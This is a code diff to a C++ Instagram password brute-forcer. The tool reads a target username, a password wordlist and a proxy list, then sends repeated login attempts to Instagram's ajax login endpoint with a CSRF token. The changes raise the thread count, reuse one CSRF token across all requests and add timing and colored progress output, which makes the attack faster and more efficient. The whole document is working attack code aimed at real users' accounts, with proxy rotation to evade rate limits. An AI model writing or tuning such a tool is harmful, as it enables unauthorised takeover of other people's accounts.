@@ -4,9 +4,12 @@ static const string BASE_URL = "https://instagram.com/";
 static string TARGET = "";
 static string WORDLIST = "wordlist.txt";
 static string PROXYLIST = "proxy.txt";
-static BYTE THREADCOUNT = 4;
+static BYTE THREADCOUNT = 12;
 static size_t cLine = 0;
 static size_t pLine = 0;
+string token = "";
+DWORD b = 0;
+
 
 vector<string> args;
 vector<string> passwords;
@@ -99,7 +102,6 @@ bool loginRequest(string username, string password, string proxy = "")
 {
 	
 	bool ret = true;
-	string token = getCsrftoken(proxy);
 	string LOGIN_URL = BASE_URL + "accounts/login/ajax/";
 	string cookie = "csrftoken=" + token + ";";
 	string head = "X-CSRFToken: " + token;
@@ -184,12 +186,16 @@ void getResult(string password)
 
 void bruteForce()
 {
+	if (b == 0) b = GetTickCount();
+	HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
+	SetConsoleTextAttribute(hConsole, 11);
 	while (cLine < passwords.size())
 	{
 		size_t m = cLine++;
 		size_t p = pLine++;
 
-		printf("-- Attacking [%s] | [%s] - [%d/%d]\n", TARGET.c_str(), passwords[m].c_str(), m, passwords.size());
+		printf("[*] Attacking [%s] | [%s] - [%d/%d] - Delay: [%dms]\n", TARGET.c_str(), passwords[m].c_str(), m, passwords.size(), GetTickCount() - b);
+		b = GetTickCount();
 		if (loginRequest(TARGET, passwords[m], p >= proxies.size() ? "" : proxies[p]))
 			getResult(passwords[m]);
 	}
@@ -281,6 +287,10 @@ int main(int argc, char* argv[], char* envp[])
 		proxies.push_back(tmp);
 
 	pfs.close();
+
+	printf("[+] Getting CSRF Token...\n");
+	token = getCsrftoken("");
+	printf("[-] CSRF Token: %s\n", token.c_str());
 
 	threads.resize(THREADCOUNT);
 
